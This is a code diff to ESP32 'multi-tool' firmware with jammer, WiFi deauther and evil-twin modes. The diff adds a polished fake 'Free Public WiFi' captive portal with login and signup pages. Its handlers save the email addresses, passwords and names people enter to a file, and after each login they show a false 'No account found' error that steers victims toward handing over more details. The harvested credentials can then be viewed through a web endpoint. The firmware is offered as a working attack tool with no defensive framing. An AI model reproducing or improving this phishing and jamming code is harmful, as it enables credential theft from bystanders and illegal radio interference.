@@ -1,5 +1,5 @@
 // =============================================================
-// ESP32 MULTI-TOOL v2.6
+// ESP32 MULTI-TOOL v2.7
 // =============================================================
 // BUTTON (GPIO0 built-in BOOT):
 //   Single click  = scroll down / next / ch+
@@ -9,8 +9,8 @@
 //
 // SWITCHES (only two working switches used):
 //   D32 = Jammer shortcut
-//   D33 = WiFi Deauther shortcut
-//   Evil Twin, NRF Cap, NRF Replay → hold button to cycle and select
+//   D33 = Evil Twin shortcut
+//   Deauther → hold button to cycle and select
 //
 // BUTTON MAP PER MODE:
 //   Deauth   : 1=next AP  2=fire on/off  3=rescan
@@ -55,8 +55,8 @@
 #define LED_BLUE   25
 #define LED_GREEN  26
 #define LED_YELLOW 27
-#define SW_JAMMER   32   // working — internal pullup → Jammer shortcut
-#define SW_DEAUTH   33   // working — internal pullup → Deauther shortcut
+#define SW_JAMMER     32   // working — internal pullup → Jammer shortcut
+#define SW_EVIL_TWIN  33   // working — internal pullup → Evil Twin shortcut
 // D34, D35, VP removed — input-only pins with no pullup, unreliable
 #define BOOT_BTN    0
 
@@ -129,8 +129,8 @@ int         holdCycleIdx  = 0;
 unsigned long holdCycleLast = 0;
 
 AppMode getSwitchMode() {
-  if (digitalRead(SW_JAMMER) == LOW) return MODE_JAMMER;
-  if (digitalRead(SW_DEAUTH) == LOW) return MODE_DEAUTH;
+  if (digitalRead(SW_JAMMER)    == LOW) return MODE_JAMMER;
+  if (digitalRead(SW_EVIL_TWIN) == LOW) return MODE_EVIL_TWIN;
   return MODE_IDLE;
 }
 bool switchActive() { return getSwitchMode() != MODE_IDLE; }
@@ -164,8 +164,8 @@ void drawIdle() {
   display.setCursor(22,0); display.print("[ MULTI-TOOL ]");
 
   // Show the two working switches
-  const char* lbl[] = { "JAMMER","DEAUTH" };
-  const int   pins[]= { SW_JAMMER, SW_DEAUTH };
+  const char* lbl[] = { "JAMMER","EV.TWIN" };
+  const int   pins[]= { SW_JAMMER, SW_EVIL_TWIN };
   for (int i = 0; i < 2; i++) {
     bool on = (digitalRead(pins[i]) == LOW);
     int col = i * 68;
@@ -302,18 +302,162 @@ void loadCredsOLED() {
   f.close();
 }
 
-const char* portalHTML=R"html(<!DOCTYPE html><html><head>
+const char* portalHTML=R"html(<!DOCTYPE html>
+<html><head>
+<meta charset='utf-8'>
 <meta name='viewport' content='width=device-width,initial-scale=1'>
-<title>Sign In</title>
-<style>body{font-family:sans-serif;max-width:380px;margin:50px auto;padding:20px}
-input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box;font-size:16px}
-button{width:100%;padding:12px;background:#0066CC;color:#fff;border:none;font-size:16px}
-</style></head><body>
-<h2>Network Login</h2><p>Sign in to access the internet.</p>
-<form method='POST' action='/login'>
-<input name='u' placeholder='Email or Username' required>
-<input name='p' type='password' placeholder='Password' required>
-<button>Connect</button></form></body></html>)html";
+<title>Free WiFi — Sign In</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f2f2f7;min-height:100vh}
+.adbar{background:#fff;border-bottom:1px solid #e5e5e5;padding:5px 14px;font-size:11px;color:#999;display:flex;justify-content:space-between;align-items:center}
+.hero{background:linear-gradient(155deg,#1a73e8 0%,#0d47a1 100%);padding:28px 16px 22px;text-align:center;color:#fff}
+.wicon{margin-bottom:10px}
+.hero h1{font-size:24px;font-weight:700;letter-spacing:-.3px}
+.hero p{font-size:14px;opacity:.85;margin-top:5px}
+.pill{display:inline-flex;gap:12px;background:rgba(255,255,255,.18);border-radius:20px;padding:5px 14px;font-size:11px;margin-top:10px}
+.card{background:#fff;margin:14px;border-radius:14px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,.07)}
+.msg{padding:10px 12px;border-radius:8px;font-size:13px;margin-bottom:14px;display:none}
+.err{background:#fdecea;color:#c62828;border:1px solid #ef9a9a}
+.ok{background:#e8f5e9;color:#2e7d32;border:1px solid#a5d6a7}
+label{display:block;font-size:12px;font-weight:600;color:#555;margin-bottom:4px}
+input{width:100%;padding:11px 13px;border:1.5px solid #ddd;border-radius:9px;font-size:15px;outline:none;margin-bottom:12px;-webkit-appearance:none;background:#fff}
+input:focus{border-color:#1a73e8}
+.btnp{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
+.btnp:active{background:#1557b0}
+.sep{display:flex;align-items:center;gap:8px;margin:14px 0;color:#ccc;font-size:12px}
+.sep::before,.sep::after{content:'';flex:1;height:1px;background:#eee}
+.btno{width:100%;padding:12px;background:#fff;color:#1a73e8;border:1.5px solid #1a73e8;border-radius:9px;font-size:15px;font-weight:600;cursor:pointer}
+.adcard{background:#fff;margin:0 14px 12px;border-radius:12px;padding:12px;box-shadow:0 1px 6px rgba(0,0,0,.06);display:flex;align-items:center;gap:11px}
+.adico{width:42px;height:42px;border-radius:9px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:20px}
+.adtxt{font-size:12px;color:#555;line-height:1.4}
+.adtxt b{color:#222;font-size:13px}
+.adtxt a{color:#1a73e8;text-decoration:none;font-weight:600}
+.footer{text-align:center;padding:4px 16px 22px;font-size:11px;color:#aaa;line-height:1.9}
+.footer a{color:#1a73e8;text-decoration:none}
+</style>
+</head><body>
+<div class='adbar'><span>Advertisement</span><span style='cursor:pointer'>✕</span></div>
+<div class='hero'>
+<div class='wicon'>
+<svg width='58' height='58' viewBox='0 0 58 58'>
+<circle cx='29' cy='29' r='29' fill='rgba(255,255,255,.18)'/>
+<circle cx='29' cy='38' r='4.5' fill='#fff'/>
+<path d='M18.5 29.5a14.8 14.8 0 0 1 21 0' stroke='#fff' stroke-width='2.8' stroke-linecap='round' fill='none'/>
+<path d='M11 22a24 24 0 0 1 36 0' stroke='#fff' stroke-width='2.8' stroke-linecap='round' fill='none'/>
+</svg>
+</div>
+<h1>Free Public WiFi</h1>
+<p>Sign in to access the internet</p>
+<div class='pill'><span>✓ Secure</span><span>✓ Unlimited</span><span>✓ Free</span></div>
+</div>
+<div class='card'>
+<div class='msg err' id='em'></div>
+<div class='msg ok' id='om'></div>
+<form id='lf' action='/login' method='POST' onsubmit='return chk()'>
+<label>Email address</label>
+<input type='email' name='u' id='eu' placeholder='you@example.com' autocomplete='email'>
+<label>Password</label>
+<input type='password' name='p' id='ep' placeholder='Enter your password' autocomplete='current-password'>
+<button class='btnp' type='submit'>Sign In</button>
+</form>
+<div class='sep'>or</div>
+<button class='btno' onclick="location.href='/signup'">Create an Account</button>
+</div>
+<div class='adcard'>
+<div class='adico' style='background:#fff3e0'>🛡️</div>
+<div class='adtxt'><b>Stay safe on public WiFi</b><br>NordVPN encrypts your data. <a href='#'>Try free →</a></div>
+</div>
+<div class='adcard'>
+<div class='adico' style='background:#e8f5e9'>⚡</div>
+<div class='adtxt'><b>WiFi Premium — 10× faster</b><br>No ads · Priority lanes · £2.99/mo. <a href='#'>Upgrade →</a></div>
+</div>
+<div class='footer'>
+By continuing you agree to our <a href='#'>Terms of Service</a> and <a href='#'>Privacy Policy</a><br>
+© 2025 FreeWiFi Network Ltd. · <a href='#'>Help</a>
+</div>
+<script>
+(function(){
+var p=new URLSearchParams(location.search);
+if(p.get('e')){var m=document.getElementById('em');m.textContent='No account found with that email. Please check your details or create a new account.';m.style.display='block';}
+if(p.get('m')){var o=document.getElementById('om');o.textContent='Account created successfully! You can now sign in.';o.style.display='block';}
+})();
+function chk(){
+var u=document.getElementById('eu').value.trim();
+var pw=document.getElementById('ep').value;
+var em=document.getElementById('em');
+em.style.display='none';
+if(!u||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(u)){em.textContent='Please enter a valid email address.';em.style.display='block';return false;}
+if(!pw||pw.length<8){em.textContent='Password must be at least 8 characters.';em.style.display='block';return false;}
+return true;
+}
+</script>
+</body></html>)html";
+
+const char* signupHTML=R"html(<!DOCTYPE html>
+<html><head>
+<meta charset='utf-8'>
+<meta name='viewport' content='width=device-width,initial-scale=1'>
+<title>Create Account — Free WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f2f2f7;min-height:100vh}
+.hero{background:linear-gradient(155deg,#1a73e8 0%,#0d47a1 100%);padding:24px 16px 18px;text-align:center;color:#fff}
+.hero h1{font-size:22px;font-weight:700}
+.hero p{font-size:13px;opacity:.85;margin-top:4px}
+.card{background:#fff;margin:14px;border-radius:14px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,.07)}
+.msg{padding:10px 12px;border-radius:8px;font-size:13px;margin-bottom:14px;display:none}
+.err{background:#fdecea;color:#c62828;border:1px solid #ef9a9a}
+label{display:block;font-size:12px;font-weight:600;color:#555;margin-bottom:4px}
+input{width:100%;padding:11px 13px;border:1.5px solid #ddd;border-radius:9px;font-size:15px;outline:none;margin-bottom:12px;-webkit-appearance:none;background:#fff}
+input:focus{border-color:#1a73e8}
+.row{display:flex;gap:10px}
+.row>div{flex:1}
+.btnp{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
+.back{text-align:center;margin-top:14px;font-size:13px;color:#888}
+.back a{color:#1a73e8;text-decoration:none;font-weight:600}
+.footer{text-align:center;padding:4px 16px 22px;font-size:11px;color:#aaa}
+.footer a{color:#1a73e8;text-decoration:none}
+</style>
+</head><body>
+<div class='hero'>
+<h1>Create Account</h1>
+<p>Free access · No payment required</p>
+</div>
+<div class='card'>
+<div class='msg err' id='em'></div>
+<form id='sf' action='/signup' method='POST' onsubmit='return schk()'>
+<div class='row'>
+<div><label>First name</label><input type='text' name='fn' id='fn' placeholder='Jane'></div>
+<div><label>Last name</label><input type='text' name='ln' id='ln' placeholder='Doe'></div>
+</div>
+<label>Email address</label>
+<input type='email' name='u' id='eu' placeholder='you@example.com' autocomplete='email'>
+<label>Password <span style='font-weight:400;color:#aaa;font-size:11px'>(min. 8 characters)</span></label>
+<input type='password' name='p' id='ep' placeholder='Create a password'>
+<label>Confirm password</label>
+<input type='password' name='p2' id='ep2' placeholder='Repeat your password'>
+<button class='btnp' type='submit'>Create Account</button>
+</form>
+<div class='back'>Already have an account? <a href='/'>Sign in</a></div>
+</div>
+<div class='footer'><a href='#'>Terms</a> &middot; <a href='#'>Privacy</a> &middot; &copy; 2025 FreeWiFi Network Ltd.</div>
+<script>
+function schk(){
+var fn=document.getElementById('fn').value.trim();
+var u=document.getElementById('eu').value.trim();
+var pw=document.getElementById('ep').value;
+var p2=document.getElementById('ep2').value;
+var em=document.getElementById('em');
+em.style.display='none';
+if(!fn){em.textContent='Please enter your first name.';em.style.display='block';return false;}
+if(!u||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(u)){em.textContent='Please enter a valid email address.';em.style.display='block';return false;}
+if(!pw||pw.length<8){em.textContent='Password must be at least 8 characters.';em.style.display='block';return false;}
+if(pw!==p2){em.textContent='Passwords do not match. Please try again.';em.style.display='block';return false;}
+return true;
+}
+</script>
+</body></html>)html";
 
 void startTwin(const char* ssid, uint8_t* bssid, uint8_t channel) {
   initWifi();
@@ -328,9 +472,18 @@ void startTwin(const char* ssid, uint8_t* bssid, uint8_t channel) {
   httpServer.on("/login",HTTP_POST,[]{
     String u=httpServer.arg("u"),p=httpServer.arg("p");
     File f=SPIFFS.open("/creds.txt",FILE_APPEND);
-    if (f){f.printf("[%lus] %s : %s\n",millis()/1000,u.c_str(),p.c_str());f.close();}
+    if (f){f.printf("[LOGIN %lus] %s : %s\n",millis()/1000,u.c_str(),p.c_str());f.close();}
     credCount++; digitalWrite(LED_GREEN,HIGH);
-    httpServer.sendHeader("Location","https://www.google.com"); httpServer.send(302);
+    httpServer.sendHeader("Location","/?e=1"); httpServer.send(302);
+  });
+  httpServer.on("/signup",HTTP_GET,[]{httpServer.send(200,"text/html",signupHTML);});
+  httpServer.on("/signup",HTTP_POST,[]{
+    String fn=httpServer.arg("fn"),ln=httpServer.arg("ln");
+    String u=httpServer.arg("u"),p=httpServer.arg("p");
+    File f=SPIFFS.open("/creds.txt",FILE_APPEND);
+    if (f){f.printf("[SIGNUP %lus] %s %s | %s : %s\n",millis()/1000,fn.c_str(),ln.c_str(),u.c_str(),p.c_str());f.close();}
+    credCount++; digitalWrite(LED_GREEN,HIGH);
+    httpServer.sendHeader("Location","/?m=1"); httpServer.send(302);
   });
   httpServer.on("/creds",HTTP_GET,[]{
     if (!httpServer.authenticate("admin",CREDS_PASSWORD))
@@ -350,7 +503,10 @@ void startTwin(const char* ssid, uint8_t* bssid, uint8_t channel) {
     SPIFFS.remove("/creds.txt"); credCount=0;
     httpServer.send(200,"text/plain","Cleared.");
   });
-  httpServer.onNotFound([]{httpServer.sendHeader("Location","http://"+apIP.toString());httpServer.send(302);});
+  httpServer.onNotFound([]{
+    httpServer.sendHeader("Location","http://192.168.4.1/");
+    httpServer.send(302);
+  });
   httpServer.begin();
   twinActive=true;
 }
@@ -385,8 +541,10 @@ void drawEvilTwin() {
     oledHeader(twinActive?"EVIL TWIN [LIVE]":"EVIL TWIN");
     if (!twinActive) {
       display.setCursor(0,13); display.print("Clone target SSID:");
-      display.setCursor(0,23);
-      if (apCount>0) {
+      if (wifiScanning) {
+        display.setCursor(0,23); display.print("Scanning APs...");
+        display.setCursor(0,35); display.print("Please wait.");
+      } else if (apCount>0) {
         int idx=twinScroll%apCount;
         display.printf("> %.16s",apList[idx].ssid);
         display.setCursor(0,33);
@@ -394,8 +552,12 @@ void drawEvilTwin() {
           apList[idx].channel,apList[idx].bssid[0],apList[idx].bssid[1],apList[idx].bssid[2]);
         char nav[12]; snprintf(nav,12,"%d/%d",(twinScroll%apCount)+1,apCount);
         display.setCursor(100,33); display.print(nav);
-      } else { display.print("> Free_WiFi (no scan)"); }
-      display.setCursor(0,46); display.print("1:next  2:launch");
+        display.setCursor(0,46); display.print("1:next  2:launch");
+      } else {
+        display.setCursor(0,23); display.print("> Free_WiFi (fallback)");
+        display.setCursor(0,35); display.print("No APs found nearby.");
+        display.setCursor(0,46); display.print("2:launch fallback");
+      }
     } else {
       display.setCursor(0,13); display.printf("SSID: %.18s",twinSSID);
       display.setCursor(0,24); display.printf("ch:%d  192.168.4.1",twinChannel);
@@ -409,9 +571,10 @@ void drawEvilTwin() {
 void handleEvilTwin() {
   if (twinCredsView) {
     if (evtSingle) credLineScroll=(credLineScroll+1)%max(credLineCount,1);
-    if (evtDouble||evtTriple) twinCredsView=false;
+    if (evtDouble) twinCredsView=false;
   } else {
     if (!twinActive) {
+      pollWifiScan();
       if (evtSingle&&apCount>0) twinScroll=(twinScroll+1)%apCount;
       if (evtDouble) {
         if (apCount>0) {
@@ -427,7 +590,6 @@ void handleEvilTwin() {
     } else {
       dnsServer.processNextRequest(); httpServer.handleClient();
       if (evtDouble) stopTwin();
-      if (evtTriple) { loadCredsOLED(); twinCredsView=true; }
     }
   }
   drawEvilTwin();
@@ -598,7 +760,9 @@ void onModeEnter(AppMode mode) {
       if (twinActive) stopTwin();
       deauthing=false; drawIdle(); break;
     case MODE_DEAUTH:    initWifi(); apSelected=0; deauthing=false; startWifiScanAsync(); break;
-    case MODE_EVIL_TWIN: credCount=0; twinScroll=0; SPIFFS.begin(true); break;
+    case MODE_EVIL_TWIN:
+      credCount=0; twinScroll=0; SPIFFS.begin(true);
+      initWifi(); startWifiScanAsync(); break;
     case MODE_JAMMER:    jamTargetIdx=0; jamCustomChan=40; jamActive=false; break;
   }
 }
@@ -610,8 +774,8 @@ void setup() {
   Serial.begin(115200);
   pinMode(LED_RED,OUTPUT); pinMode(LED_BLUE,OUTPUT);
   pinMode(LED_GREEN,OUTPUT); pinMode(LED_YELLOW,OUTPUT);
-  pinMode(SW_JAMMER, INPUT_PULLUP);
-  pinMode(SW_DEAUTH, INPUT_PULLUP);
+  pinMode(SW_JAMMER,    INPUT_PULLUP);
+  pinMode(SW_EVIL_TWIN, INPUT_PULLUP);
   pinMode(BOOT_BTN,  INPUT_PULLUP);
 
   Wire.begin(OLED_SDA,OLED_SCL);
@@ -621,7 +785,7 @@ void setup() {
   display.setCursor(18,8);  display.print("MULTI");
   display.setCursor(14,28); display.print("-TOOL-");
   display.setTextSize(1);
-  display.setCursor(20,50); display.print("v2.6  ESP32+nRF24");
+  display.setCursor(20,50); display.print("v2.7  ESP32+nRF24");
   display.display();
 
   for (int i=0;i<3;i++) {
@@ -653,13 +817,21 @@ void loop() {
   } else if (sw==MODE_IDLE && currentMode!=MODE_IDLE && !switchActive() && !isHolding) {
     // Only reset to idle if the current mode was set by a switch (not by hold-cycle)
     // Check: if the switch that would have activated currentMode is no longer active
-    bool modeFromSwitch = (currentMode==MODE_JAMMER || currentMode==MODE_DEAUTH);
+    bool modeFromSwitch = (currentMode==MODE_JAMMER || currentMode==MODE_EVIL_TWIN);
     if (modeFromSwitch) { currentMode=MODE_IDLE; onModeEnter(MODE_IDLE); }
+  }
+
+  // Evil Twin: triple = creds viewer toggle (NOT exit)
+  if (evtTriple && currentMode==MODE_EVIL_TWIN) {
+    if (twinActive && !twinCredsView) { loadCredsOLED(); twinCredsView=true; return; }
+    if (twinCredsView) { twinCredsView=false; return; }
+    // if twin not active: fall through to global exit below
   }
 
   // Triple = exit to idle
   if (evtTriple && currentMode!=MODE_IDLE) {
     if (jamActive) jamStop();
+    if (twinActive) stopTwin();
     currentMode=MODE_IDLE; onModeEnter(MODE_IDLE);
     return;
   }
